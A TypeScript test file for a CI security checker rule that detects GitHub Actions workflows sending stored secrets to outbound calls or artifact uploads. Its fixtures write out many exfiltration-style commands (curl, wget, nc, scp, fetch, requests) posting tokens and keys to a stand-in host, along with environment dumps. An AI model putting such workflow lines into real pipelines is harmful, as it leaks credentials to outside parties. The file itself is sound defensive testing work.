/**
 * WORKFLOW_SECRET_TO_UPLOAD_PATH is evaluated per step: a stored (non-ambient)
 * secret must be in scope for the same step that makes an outbound call or
 * uploads an artifact. It used to be a file-level text match, which reported
 * comments, `fetch-depth:` inputs, URL literals in regexes, loopback health
 * checks and secrets that lived in a different step.
 */

import { describe, it, expect, beforeEach, afterEach } from "vitest";
import * as fs from "node:fs";
import * as path from "node:path";
import * as os from "node:os";
import { modelWorkflows } from "../workflow-modeler.js";
import { performanceBudget } from "./performance-budget.js";

const RULE = "WORKFLOW_SECRET_TO_UPLOAD_PATH";

let dir: string;
beforeEach(() => {
  dir = fs.mkdtempSync(path.join(os.tmpdir(), "scg-wf-egress-"));
});
afterEach(() => {
  fs.rmSync(dir, { recursive: true, force: true });
});

function write(rel: string, lines: string[]): void {
  const full = path.join(dir, rel);
  fs.mkdirSync(path.dirname(full), { recursive: true });
  fs.writeFileSync(full, lines.join("\n"));
}

function workflow(lines: string[]): void {
  write(".github/workflows/ci.yml", lines);
}

function hits(): number[] {
  return modelWorkflows(dir)
    .filter((f) => f.rule === RULE)
    .map((f) => f.line ?? -1);
}

const HEAD = ["name: CI", "on: push", "jobs:", "  build:", "    runs-on: ubuntu-latest"];

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: must fire, on the step's line", () => {
  it("fires for a step whose inline env holds a stored secret and whose run curls it out", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - uses: actions/checkout@v4",
      '      - env: { T: "${{ secrets.NPM_TOKEN }}" }',
      '        run: curl -d "$T" https://x.example',
    ]);
    expect(hits()).toEqual([8]);
  });

  it("fires for an upload-artifact step whose own env holds a stored secret", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - run: npm ci",
      "      - uses: actions/upload-artifact@v4",
      "        env:",
      "          DEPLOY_KEY: ${{ secrets.DEPLOY_KEY }}",
      "        with:",
      "          name: dist",
      "          path: dist/",
    ]);
    expect(hits()).toEqual([8]);
  });

  it("fires for a job whose env holds a stored secret and whose step runs wget", () => {
    workflow([
      ...HEAD,
      "    env:",
      "      API_KEY: ${{ secrets.API_KEY }}",
      "    steps:",
      "      - run: npm test",
      "      - name: report",
      "        run: |",
      '          wget --header "X-Key: $API_KEY" https://x.example/report',
    ]);
    expect(hits()).toEqual([10]);
  });

  it("fires for a workflow-level env secret and a curl step", () => {
    write(".github/workflows/ci.yml", [
      "name: CI",
      "on: push",
      "env:",
      "  T: ${{ secrets.NPM_TOKEN }}",
      "jobs:",
      "  build:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      '      - run: curl -H "Authorization: $T" https://x.example',
    ]);
    expect(hits()).toEqual([9]);
  });

  it("fires when the secret is interpolated directly into the run body", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - run: |",
      "          echo start",
      '          curl -d "${{ secrets.NPM_TOKEN }}" https://x.example',
    ]);
    expect(hits()).toEqual([7]);
  });

  it("fires for bracket access with single and double quotes", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          T: ${{ secrets['NPM_TOKEN'] }}",
      '        run: curl -d "$T" https://x.example',
      "      - env:",
      '          U: ${{ secrets["NPM_TOKEN"] }}',
      "        uses: actions/upload-artifact@v4",
    ]);
    expect(hits()).toEqual([7, 10]);
  });

  it("fires for the whole secrets context, via toJSON and bare", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          ALL: ${{ toJSON(secrets) }}",
      '        run: curl -d "$ALL" https://x.example',
      "      - env:",
      "          ALL: ${{secrets}}",
      "        uses: actions/upload-artifact@v4",
    ]);
    expect(hits()).toEqual([7, 10]);
  });

  it("fires for whitespace variants inside the expression", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          T: ${{secrets . NPM_TOKEN}}",
      '        run: curl -d "$T" https://x.example',
    ]);
    expect(hits()).toEqual([7]);
  });

  it("fires for a fetch() call in a github-script step with a stored secret in env", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - uses: actions/github-script@v7",
      "        env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        with:",
      "          script: |",
      "            await fetch('https://x.example', { method: 'POST', body: process.env.T });",
    ]);
    expect(hits()).toEqual([7]);
  });

  it("fires for a github-script step that receives a stored secret as an input and calls fetch()", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - uses: actions/github-script@v7",
      "        with:",
      "          github-token: ${{ secrets.RELEASE_PAT }}",
      "          script: |",
      "            await fetch('https://x.example/hook', { method: 'POST' });",
    ]);
    expect(hits()).toEqual([7]);
  });

  it("fires for nc and a curl whose target is a variable", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      '        run: echo "$T" | nc x.example 9000',
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      '        run: curl -d "$T" "$TARGET"',
    ]);
    expect(hits()).toEqual([7, 10]);
  });

  it("fires when a loopback call and an external call share one step", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        run: |",
      "          curl http://127.0.0.1:8080/health",
      '          curl -d "$T" https://x.example',
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      '        run: curl -d "$T" http://localhost@x.example/',
    ]);
    expect(hits()).toEqual([7, 12]);
  });

  it("fires for secrets: inherit into a reusable workflow outside this repository", () => {
    workflow([
      "name: CI",
      "on: push",
      "jobs:",
      "  release:",
      "    uses: some-org/pipelines/.github/workflows/release.yml@0123456789abcdef0123456789abcdef01234567",
      "    secrets: inherit",
      "  other:",
      "    uses: some-org/pipelines/.github/workflows/lint.yml@0123456789abcdef0123456789abcdef01234567",
      "    secrets:",
      "      token: ${{ secrets.NPM_TOKEN }}",
      "  ambient:",
      "    uses: some-org/pipelines/.github/workflows/lint.yml@0123456789abcdef0123456789abcdef01234567",
      "    secrets:",
      "      token: ${{ secrets.GITHUB_TOKEN }}",
    ]);
    expect(hits()).toEqual([4, 7]);
  });

  it("fires for a local composite action that makes an outbound call and receives a stored secret", () => {
    write(".github/actions/notify/action.yml", [
      "name: notify",
      "inputs:",
      "  token:",
      "    required: true",
      "runs:",
      "  using: composite",
      "  steps:",
      "    - shell: bash",
      '      run: curl -H "Authorization: ${{ inputs.token }}" https://x.example',
    ]);
    write(".github/actions/local-only/action.yml", [
      "name: local-only",
      "runs:",
      "  using: composite",
      "  steps:",
      "    - shell: bash",
      "      run: echo done",
    ]);
    workflow([
      ...HEAD,
      "    steps:",
      "      - uses: ./.github/actions/notify",
      "        with:",
      "          token: ${{ secrets.NPM_TOKEN }}",
      "      - uses: ./.github/actions/local-only",
      "        with:",
      "          token: ${{ secrets.NPM_TOKEN }}",
    ]);
    expect(hits()).toEqual([7]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: false positives", () => {
  it("does not fire when the secret is in one step and the curl in another", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        run: npm publish",
      "      - run: curl https://x.example/ping",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not fire for an upload whose job keeps the stored token in a different step's env", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}",
      "        run: npm publish",
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          name: dist",
      "          path: dist/",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not fire for comments, fetch-depth, a URL in a regex literal, or prose words", () => {
    workflow([
      "# curl -d ${{ secrets.NPM_TOKEN }} https://x.example",
      ...HEAD,
      "    steps:",
      "      - uses: actions/checkout@v4",
      "        with:",
      "          fetch-depth: 0",
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        run: |",
      "          # curl -d \"$T\" https://x.example",
      "          grep -E 'https?://[a-z.]+' urls.txt",
      "          echo prefetched and fetched",
      "          npm publish",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not fire for loopback health checks", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        run: |",
      "          curl -fsS http://127.0.0.1:8080/health",
      '          curl -H "Authorization: Bearer $T" http://localhost:3000/api -o /dev/null',
      "          wget -qO- http://[::1]:9000/ready",
      "          nc -z localhost 5432",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not fire for git fetch", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        run: git fetch origin main --depth=1",
    ]);
    expect(hits()).toEqual([]);
  });

  it("treats secrets.GITHUB_TOKEN, bracket GITHUB_TOKEN and github.token the same way (ambient)", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          A: ${{ secrets.GITHUB_TOKEN }}",
      '        run: curl -H "Authorization: $A" https://api.x.example',
      "      - env:",
      "          B: ${{ secrets['GITHUB_TOKEN'] }}",
      '        run: curl -H "Authorization: $B" https://api.x.example',
      "      - env:",
      "          C: ${{ github.token }}",
      '        run: curl -H "Authorization: $C" https://api.x.example',
      "      - env:",
      "          D: ${{ secrets.github_token }}",
      "        uses: actions/upload-artifact@v4",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not fire for a stored secret passed only as a with: input to a remote action", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - uses: some-org/deploy@0123456789abcdef0123456789abcdef01234567",
      "        with:",
      "          token: ${{ secrets.NPM_TOKEN }}",
      "          url: https://x.example",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not count with: inputs of an upload-artifact step", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          name: report-${{ secrets.BUILD_LABEL }}",
      "          path: out/",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not fire for a service container's env", () => {
    workflow([
      ...HEAD,
      "    services:",
      "      db:",
      "        image: postgres:16",
      "        env:",
      "          POSTGRES_PASSWORD: ${{ secrets.DB_PASSWORD }}",
      "    steps:",
      "      - run: curl https://x.example/ping",
    ]);
    expect(hits()).toEqual([]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: flow between steps and other egress tools", () => {
  it("fires when a step exports the secret to $GITHUB_ENV and a later step curls it out", () => {
    workflow([
      ...HEAD,
      "    steps:",
      '      - run: echo "TOKEN=${{ secrets.NPM_TOKEN }}" >> "$GITHUB_ENV"',
      "      - run: echo building",
      '      - run: curl -d "$TOKEN" https://x.example/i',
    ]);
    expect(hits()).toEqual([9]);
  });

  it("fires when a step writes the secret to a file and a later step uploads an artifact", () => {
    workflow([
      ...HEAD,
      "    steps:",
      '      - run: echo "${{ secrets.SIGNING_KEY }}" > key.txt && tar czf out.tgz key.txt',
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          path: out.tgz",
    ]);
    expect(hits()).toEqual([8]);
  });

  it("fires for a secret placed in a matrix value", () => {
    workflow([
      ...HEAD,
      "    strategy:",
      "      matrix:",
      '        token: ["${{ secrets.A_TOKEN }}"]',
      "    steps:",
      '      - run: curl -d "${{ matrix.token }}" https://x.example/i',
    ]);
    expect(hits()).toEqual([10]);
  });

  it("fires for Python requests, PowerShell Invoke-WebRequest and scp to a remote host", () => {
    workflow([
      ...HEAD,
      "    env:",
      "      T: ${{ secrets.NPM_TOKEN }}",
      "    steps:",
      `      - run: python -c "import requests; requests.post('https://x.example', data='$T')"`,
      "      - run: Invoke-WebRequest -Uri https://x.example -Body $env:T",
      "      - run: scp o.txt user@x.example:/tmp/",
    ]);
    expect(hits()).toEqual([9, 10, 11]);
  });

  it("does not carry the secret past a step that only discards output, or into another job", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - run: npm publish > /dev/null 2>&1",
      "        env:",
      "          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}",
      "      - run: curl -fsS https://x.example/health",
      "  other:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      '      - run: echo "T=${{ secrets.NPM_TOKEN }}" >> "$GITHUB_ENV"',
      "  third:",
      "    runs-on: ubuntu-latest",
      "    steps:",
      "      - run: curl -fsS https://x.example/health",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not fire for a local rsync or for gh api with a stored token", () => {
    workflow([
      ...HEAD,
      "    env:",
      "      T: ${{ secrets.NPM_TOKEN }}",
      "    steps:",
      "      - run: rsync -a dist/ out/",
      "      - run: gh api repos/o/r/releases",
    ]);
    expect(hits()).toEqual([]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: what a later step can reach", () => {
  it("does not carry a file write to a later step that reads no file", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          NODE_AUTH_TOKEN: ${{ secrets.NPM_TOKEN }}",
      "        run: |",
      "          cat > .npmrc <<EOF",
      "          //registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}",
      "          EOF",
      "          npm publish && echo done > publish.log",
      "      - run: curl -fsS https://x.example/health",
    ]);
    expect(hits()).toEqual([]);
  });

  it("carries a file write to a later step that reads the file and sends it", () => {
    workflow([
      ...HEAD,
      "    steps:",
      '      - run: echo "TOKEN=$T" | tee -a env.sh',
      "        env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      '      - run: source env.sh && curl -d "$TOKEN" https://x.example/i',
    ]);
    expect(hits()).toEqual([10]);

    // PowerShell cmdlet names are case-insensitive.
    workflow([
      ...HEAD,
      "    steps:",
      "      - run: $env:T | out-file carried.txt",
      "        env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      '      - run: curl -F "f=@carried.txt" https://x.example/i',
    ]);
    expect(hits()).toEqual([10]);
  });

  it("carries a github-script export and file write", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - uses: actions/github-script@v7",
      "        env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        with:",
      "          script: |",
      "            core.exportVariable('CARRIED', process.env.T)",
      '      - run: curl -d "$CARRIED" https://x.example/i',
    ]);
    expect(hits()).toEqual([13]);

    workflow([
      ...HEAD,
      "    steps:",
      "      - uses: actions/github-script@v7",
      "        with:",
      "          github-token: ${{ secrets.PAT }}",
      "          script: |",
      "            require('fs').writeFileSync('out.txt', 'x')",
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          path: out.txt",
    ]);
    expect(hits()).toEqual([12]);
  });

  it("reads a transfer tool called by its full path as egress", () => {
    workflow([
      ...HEAD,
      "    env:",
      "      T: ${{ secrets.NPM_TOKEN }}",
      "    steps:",
      "      - run: /usr/bin/sftp -b batch.txt user@x.example",
      "      - run: /usr/bin/scp o.txt user@x.example:/tmp/",
    ]);
    expect(hits()).toEqual([9, 10]);
  });

  it("follows a written file by name, however a later step reads it", () => {
    for (const reader of [
      `python3 -c "import requests; requests.post('https://x.example', data=open('secret.txt').read())"`,
      'curl -d "$(base64 secret.txt)" https://x.example/i',
      "jq -c . secret.txt | curl -d @- https://x.example/i",
      `node -e "const https = require('https'); https.request('https://x.example').end(require('fs').readFileSync('secret.txt'))"`,
    ]) {
      workflow([
        ...HEAD,
        "    steps:",
        '      - env: { T: "${{ secrets.SIGNING_KEY }}" }',
        '        run: echo "$T" > secret.txt',
        `      - run: ${reader}`,
      ]);
      expect(hits(), reader).toEqual([9]);
    }
  });

  it("passes a written file on through a step that reads it and writes another", () => {
    workflow([
      ...HEAD,
      "    steps:",
      '      - env: { T: "${{ secrets.SIGNING_KEY }}" }',
      '        run: echo "$T" > dist/key.txt',
      "      - run: tar czf bundle.tgz dist",
      "      - run: curl -T bundle.tgz https://x.example/upload",
    ]);
    expect(hits()).toEqual([10]);
  });

  it("does not treat a comparison as reading the written file", () => {
    workflow([
      ...HEAD,
      "    steps:",
      '      - env: { T: "${{ secrets.SIGNING_KEY }}" }',
      '        run: echo "$T" > key.txt',
      "      - run: |",
      '          python3 -c "assert 1 < 2"',
      "          curl -fsS https://x.example/health",
    ]);
    expect(hits()).toEqual([]);
  });

  it("falls back to any file read when the written file has no stated name", () => {
    workflow([
      ...HEAD,
      "    steps:",
      '      - env: { T: "${{ secrets.SIGNING_KEY }}" }',
      '        run: echo "$T" > "$OUT_FILE"',
      "      - run: curl -fsS https://x.example/health",
      '      - run: python3 -c "assert 1 < 2" && curl -fsS https://x.example/health',
      '      - run: curl -d @"$OUT_FILE" https://x.example/i',
      '      - run: source "$OUT_FILE" && curl -d "$T2" https://x.example/i',
    ]);
    expect(hits()).toEqual([11, 12]);
  });

  it("follows a file Python opens for writing, and not a stderr redirect", () => {
    workflow([
      ...HEAD,
      "    env:",
      "      T: ${{ secrets.SIGNING_KEY }}",
      "    steps:",
      `      - run: python3 -c "import os; open('k.txt', 'w').write(os.environ['T'])"`,
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          path: k.txt",
    ]);
    expect(hits()).toEqual([10]);

    workflow([
      ...HEAD,
      "    env:",
      "      T: ${{ secrets.SIGNING_KEY }}",
      "    steps:",
      '      - run: test -n "$T" 2> err.log',
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          path: err.log",
    ]);
    expect(hits()).toEqual([]);
  });

  it("counts a whole-environment dump as holding every secret in scope", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - run: printenv >> $GITHUB_ENV",
      "        env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      '      - run: curl -d "$T" https://x.example/i',
    ]);
    expect(hits()).toEqual([10]);

    workflow([
      ...HEAD,
      "    env:",
      "      U: ${{ secrets.NPM_TOKEN }}",
      "    steps:",
      '      - run: node -e "require(\'fs\').writeFileSync(\'env.json\', JSON.stringify(process.env))"',
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          path: env.json",
    ]);
    expect(hits()).toEqual([10]);

    // `set -e` sets shell options; it does not print the environment.
    workflow([
      ...HEAD,
      "    env:",
      "      V: ${{ secrets.NPM_TOKEN }}",
      "    steps:",
      "      - run: set -euo pipefail > ok.txt",
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          path: ok.txt",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not send a job-level secret through an upload unless a file carries it", () => {
    workflow([
      ...HEAD,
      "    env:",
      "      TURBO_TOKEN: ${{ secrets.TURBO_TOKEN }}",
      "    steps:",
      "      - run: npx turbo build > build.log",
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          path: build.log",
    ]);
    expect(hits()).toEqual([]);

    workflow([
      ...HEAD,
      "    env:",
      "      TURBO_TOKEN: ${{ secrets.TURBO_TOKEN }}",
      "    steps:",
      '      - run: echo "$TURBO_TOKEN" > token.txt',
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          path: token.txt",
    ]);
    expect(hits()).toEqual([10]);
  });

  it("follows a deploy key into ssh, in the same step and across steps", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          KEY: ${{ secrets.SSH_PRIVATE_KEY }}",
      "        run: |",
      '          printf "%s" "$KEY" > key && chmod 600 key',
      "          ssh -i key -p 2222 -o StrictHostKeyChecking=yes deploy@x.example ./deploy.sh",
    ]);
    expect(hits()).toEqual([7]);

    workflow([
      ...HEAD,
      "    steps:",
      "      - env:",
      "          KEY: ${{ secrets.SSH_PRIVATE_KEY }}",
      '        run: printf "%s" "$KEY" > "$RUNNER_TEMP/ssh/deploy_key"',
      '      - run: ssh -i "$RUNNER_TEMP/ssh/deploy_key" deploy@x.example ./deploy.sh',
    ]);
    expect(hits()).toEqual([10]);
  });

  it("does not count ssh-keygen, ssh-keyscan or ssh to loopback as egress", () => {
    workflow([
      ...HEAD,
      "    env:",
      "      KEY: ${{ secrets.SSH_PRIVATE_KEY }}",
      "    steps:",
      '      - run: ssh-keygen -R x.example -f "$HOME/.ssh/known_hosts"',
      "      - run: ssh-keyscan -p 22 x.example",
      "      - run: ssh -p 2222 git@127.0.0.1 true",
    ]);
    expect(hits()).toEqual([]);
  });

  it("does not read a Windows drive path or a script named after a tool as egress", () => {
    workflow([
      ...HEAD,
      "    env:",
      "      T: ${{ secrets.NPM_TOKEN }}",
      "    steps:",
      "      - run: scp file.txt C:\\builds\\out\\",
      "      - run: ./scripts/irm.sh --check",
      "      - run: rsync -a --exclude=a:b src/ dst/",
    ]);
    expect(hits()).toEqual([]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: files followed by path", () => {
  const secretStep = ['      - env: { T: "${{ secrets.SIGNING_KEY }}" }'];

  it.each([
    ["dd of=", 'run: printf "%s" "$T" | dd of=k.bin', "      - run: curl -T k.bin https://x.example/u"],
    ["openssl -out", 'run: printf "%s" "$T" | openssl enc -aes-256-cbc -pass pass:x -out k.enc', "      - run: curl -T k.enc https://x.example/u"],
    ["pathlib", `run: python3 -c "import os, pathlib; pathlib.Path('k.txt').write_text(os.environ['T'])"`, "      - run: curl -T k.txt https://x.example/u"],
    ["clobber redirect", 'run: echo "$T" >| k.txt', "      - run: curl -T k.txt https://x.example/u"],
    ["variable indirection", 'run: X=$T; echo "$X" > k.txt', "      - run: curl -d @k.txt https://x.example/u"],
    ["tar of the directory", 'run: echo "$T" > k.txt', "      - run: tar czf a.tgz . && curl -T a.tgz https://x.example/u"],
    ["zip of the directory", 'run: echo "$T" > k.txt', "      - run: zip -r a.zip . && curl -T a.zip https://x.example/u"],
    ["a matching glob", 'run: echo "$T" > k.txt', '      - run: curl -T "*.txt" https://x.example/u'],
  ])("follows a secret written with %s", (_label, write, send) => {
    workflow([...HEAD, "    steps:", ...secretStep, `        ${write}`, send]);
    expect(hits()).toEqual([9]);
  });

  // After an export whose variable names cannot be told, the whole step holds
  // the secret, and only its explicit file writes are followed, so each write
  // form must be parsed.
  it.each([
    ["tee", "printf x | tee out.txt"],
    ["a lowercase PowerShell cmdlet", '"x" | out-file out.txt'],
    ["Python open for writing", `python3 -c "open('out.txt', 'w').write('x')"`],
  ])("follows %s in a step after an export of unknown names", (_label, write) => {
    workflow([
      ...HEAD,
      "    steps:",
      ...secretStep,
      '        run: printenv >> "$GITHUB_ENV"',
      `      - run: ${write}`,
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          path: out.txt",
    ]);
    expect(hits()).toEqual([10]);
  });

  it("follows a file under a computed directory to a later relative read of it", () => {
    // A dotless name, so only the path decides, not a token in code.
    workflow([
      ...HEAD,
      "    steps:",
      '      - env: { T: "${{ secrets.SIGNING_KEY }}" }',
      `        run: python3 -c "import os; d='out'; open(f'{d}/token','w').write(os.environ['T'])"`,
      "      - run: curl -T out/token https://x.example/u",
    ]);
    expect(hits()).toEqual([9]);
  });

  it("does not count a secret tested in the step's if: as used by the step", () => {
    workflow([
      ...HEAD,
      "    steps:",
      "      - if: ${{ secrets.DEPLOY_KEY }}",
      "        run: curl -fsS https://x.example/health",
    ]);
    expect(hits()).toEqual([]);
  });

  it("follows an exported name, not every later write", () => {
    workflow([
      ...HEAD,
      "    steps:",
      ...secretStep,
      '        run: echo "TOKEN=$T" >> "$GITHUB_ENV"',
      "      - run: npm test > report.txt",
      '      - run: echo "$TOKEN" > token.txt',
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          path: report.txt",
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          path: token.txt",
    ]);
    expect(hits()).toEqual([14]);
  });

  it("keeps a heredoc body with the command that reads it", () => {
    workflow([
      ...HEAD,
      "    steps:",
      ...secretStep,
      "        run: |",
      "          base64 > k.b64 <<EOF",
      "          $T",
      "          EOF",
      "      - run: curl -T k.b64 https://x.example/u",
    ]);
    expect(hits()).toEqual([12]);
  });

  it("taints only what the command reading the file produces, not the rest of its step", () => {
    workflow([
      ...HEAD,
      "    steps:",
      ...secretStep,
      '        run: echo "$T" > secret.txt',
      "      - run: |",
      "          cat secret.txt > /dev/null",
      "          gcc -o app.exe main.c",
      "          cp README.md release/README.md",
      "      - run: curl -T release/README.md https://x.example/u",
    ]);
    expect(hits()).toEqual([]);
  });

  it("reaches an upload only when its path covers the tainted file", () => {
    workflow([
      ...HEAD,
      "    steps:",
      ...secretStep,
      '        run: mkdir -p logs/dist && echo "$T" > logs/dist/debug.txt',
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          path: dist/",
    ]);
    expect(hits()).toEqual([]);

    workflow([
      ...HEAD,
      "    steps:",
      ...secretStep,
      '        run: mkdir -p dist && echo "$T" > dist/notes.txt',
      "      - uses: actions/upload-artifact@v4",
      "        with:",
      "          path: |",
      "            dist/",
      "            !dist/*.map",
    ]);
    expect(hits()).toEqual([9]);
  });
});

describe("WORKFLOW_SECRET_TO_UPLOAD_PATH: linear on 5 MiB input", () => {
  const FIVE_MIB = 5 * 1024 * 1024;

  function timed(lines: string[]): number {
    workflow(lines);
    const started = performance.now();
    modelWorkflows(dir);
    return performance.now() - started;
  }

  it("unclosed expressions, fetch( without a literal and one long curl line", { timeout: performanceBudget(60_000) }, () => {
    const unclosed = "${{ secrets ".repeat(Math.ceil(FIVE_MIB / 12));
    expect(
      timed([...HEAD, "    steps:", "      - env:", `          T: ${unclosed}`, "        run: curl https://x.example"]),
    ).toBeLessThan(performanceBudget(15_000));

    const fetches = "fetch( ".repeat(Math.ceil(FIVE_MIB / 7));
    expect(
      timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", `        run: ${fetches}`]),
    ).toBeLessThan(performanceBudget(15_000));

    const args = "localhost ".repeat(Math.ceil(FIVE_MIB / 10));
    expect(
      timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", `        run: curl ${args}`]),
    ).toBeLessThan(performanceBudget(15_000));

    const remote = "a@a@a@a@a.b.c.d.e.f.g.h.i ".repeat(Math.ceil(FIVE_MIB / 26));
    expect(
      timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", `        run: scp ${remote}`]),
    ).toBeLessThan(performanceBudget(15_000));

    const cats = "cat cat ".repeat(Math.ceil(FIVE_MIB / 8));
    expect(
      timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", '        run: echo "$T" > "$F"', `      - run: curl https://x.example ${cats}`]),
    ).toBeLessThan(performanceBudget(15_000));

    const quotes = '"'.repeat(FIVE_MIB);
    expect(
      timed([...HEAD, "    steps:", "      - env:", "          T: ${{ secrets.X }}", `        run: curl -H ${quotes}`]),
    ).toBeLessThan(performanceBudget(15_000));
  });

  it("many deep paths just under the length cap", { timeout: performanceBudget(60_000) }, () => {
    // 2,000 levels in under 4,096 characters: without the depth cap every
    // ancestor prefix is kept, which is quadratic in memory per path.
    const writes = Array.from({ length: 250 }, (_, i) => `          echo "$T" > ${"a/".repeat(2_000)}k${i}`);
    expect(
      timed([...HEAD, "    steps:", '      - env: { T: "${{ secrets.X }}" }', "        run: |", ...writes, "      - run: curl -T a https://x.example"]),
    ).toBeLessThan(performanceBudget(5_000));
  });

  it("a glob with many stars, a deep path, a long fd, a long env word, many secret names", { timeout: performanceBudget(60_000) }, () => {
    const secretStep = ['      - env: { T: "${{ secrets.X }}" }'];
    // A 210-byte workflow that backtracked exponentially through a RegExp glob.
    expect(timed([...HEAD, "    steps:", ...secretStep, `        run: echo "$T" > ${"a".repeat(200)}`, `      - run: ls ${"*a".repeat(20)}*b`])).toBeLessThan(performanceBudget(5_000));
    // Ancestors of a 200,000-level path: quadratic memory before.
    expect(timed([...HEAD, "    steps:", ...secretStep, `        run: echo "$T" > ${"a/".repeat(200_000)}k.txt`])).toBeLessThan(performanceBudget(15_000));
    // The fd digits before a redirection.
    expect(timed([...HEAD, "    steps:", ...secretStep, `        run: echo "$T" ${"1".repeat(1_000_000)}x>f.txt`])).toBeLessThan(performanceBudget(15_000));
    // One long word with no colon in an env block scalar.
    expect(timed([...HEAD, "    env:", "      T: ${{ secrets.K }}", "      U: |", "        " + "a".repeat(FIVE_MIB), "    steps:", "      - run: curl https://x.example"])).toBeLessThan(performanceBudget(15_000));
    // Many secret names in the workflow env, and many steps.
    const names = Array.from({ length: 50_000 }, (_, i) => `  N${i}: \${{ secrets.S${i} }}`);
    const steps = Array.from({ length: 5_000 }, () => "      - run: echo ok");
    expect(timed(["name: CI", "on: push", "env:", ...names, "jobs:", "  build:", "    runs-on: x", "    steps:", ...steps])).toBeLessThan(performanceBudget(15_000));
  });

  it("floods of globs against many tainted files", { timeout: performanceBudget(60_000) }, () => {
    const tainted = [
      '      - env: { T: "${{ secrets.X }}" }',
      "        run: |",
      ...Array.from({ length: 250 }, (_, i) => `          echo "$T" > d${i}/k${i}.txt`),
    ];
    const repeated = "*.x ".repeat(Math.ceil(FIVE_MIB / 4));
    expect(timed([...HEAD, "    steps:", ...tainted, `      - run: curl -T ${repeated}`])).toBeLessThan(
      performanceBudget(15_000),
    );
    // A glob repeated past the evaluation cap keeps its own answer: *.x covers no .txt.
    expect(hits()).toEqual([]);
    let distinct = "";
    for (let i = 0; distinct.length < FIVE_MIB; i++) distinct += `*.x${i} `;
    expect(timed([...HEAD, "    steps:", ...tainted, `      - run: curl -T ${distinct}`])).toBeLessThan(
      performanceBudget(15_000),
    );
  });

  it("many steps each with a secret and a loopback call", { timeout: performanceBudget(60_000) }, () => {
    const step = [
      "      - env:",
      "          T: ${{ secrets.NPM_TOKEN }}",
      "        run: curl http://127.0.0.1:8080/health",
    ];
    const per = step.join("\n").length + 1;
    const lines = [...HEAD, "    steps:"];
    for (let i = 0; i < Math.ceil(FIVE_MIB / per); i++) lines.push(...step);
    expect(timed(lines)).toBeLessThan(performanceBudget(15_000));
    expect(hits()).toEqual([]);
  });
});
